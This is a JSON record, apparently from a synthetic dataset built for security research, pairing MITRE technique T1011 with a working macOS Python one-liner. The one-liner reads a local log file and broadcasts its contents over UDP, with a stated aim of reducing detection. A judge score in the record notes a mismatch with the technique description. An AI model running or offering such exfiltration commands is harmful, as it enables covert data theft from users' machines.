{
  "technique_id": "T1011",
  "platform": "macOS",
  "shell": "Python",
  "command": "python3 -c 'import socket; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1); addr=(\"255.255.255.255\", 49876); d=open(\"/Users/Shared/.sync.log\",\"rb\").read(); [s.sendto(d[i:i+1024], addr) for i in range(0,len(d),1024)]; s.close()'",
  "explanation": "Exfiltrates data via IPv4 broadcast UDP on a non-standard high port, using local broadcast as an alternative network medium separate from a primary unicast channel, consistent with T1011.",
  "rationale_steps": [
    "Create an IPv4 UDP socket and enable broadcast.",
    "Target the broadcast address with an uncommon port (49876) to reduce detection.",
    "Chunk and transmit data as UDP datagrams (broadcast medium distinct from typical unicast C2).",
    "No obfuscation; user-level safe."
  ],
  "obfuscation_level": "none",
  "id": "SYN-PYTHON-T1011-e8d4b4c2-d7687590",
  "source_prompt_hash": "e8d4b4c2",
  "timestamp_utc": "2025-09-30T08:45:56.629990Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "The python3 -c one-liner is well-formed with balanced quotes/parentheses and valid socket calls, so it should run as written.",
        "semantic_score": 2,
        "semantic_justification": "While it plausibly exfiltrates file data via UDP broadcast, it does not leverage a trusted system script proxy as described in the provided technique description, making it misaligned with that technique.",
        "combined_score": 3.5,
        "confidence": 0.74,
        "timestamp": "2025-10-01T22:03:31.435759Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 2.0,
    "llm_average_score": 3.5,
    "llm_verdict": "uncertain",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}